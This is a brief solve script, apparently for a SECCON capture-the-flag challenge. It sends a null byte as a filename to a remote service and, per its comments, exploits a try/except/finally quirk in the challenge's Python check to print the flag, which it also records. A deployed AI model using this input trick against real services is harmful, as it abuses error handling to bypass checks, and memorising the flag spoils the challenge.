from pwn import *

io = remote('find-flag.seccon.games', 10042)
io.sendlineafter('filename: ', b'\x00')
# ValueError: embedded null byte in open()
print(io.recvall())

# try:
#     check = check()
# except:
#     print("[-] something went wrong")
#     exit(1)
# finally:
#     # This 'check' is a not local variable until the expression in 'try' is evaluated !
#     # check = <function check at 0x7f147bff5040> (<class 'function'>)
#     if check:
#         print("[+] congrats!")
#         print(FLAG.decode())

# SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}
